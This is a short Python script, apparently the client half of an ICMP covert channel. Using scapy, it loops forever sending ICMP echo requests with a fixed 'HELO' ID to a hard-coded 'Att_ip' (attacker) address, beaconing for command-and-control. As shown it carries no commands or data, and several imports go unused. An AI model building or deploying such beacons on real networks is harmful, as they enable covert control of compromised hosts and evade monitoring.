from scapy.all import sr,IP,ICMP,Raw,sniff
import argparse
import os

Att_ip="10.1.0.138"
ICMP_ID_HELO = int(23144)
ICMP_ID = int(13331)

TTL = int(64)

def main():
    while True:
        beacon = sr( IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO))


 
if __name__ == "__main__":
    main()






 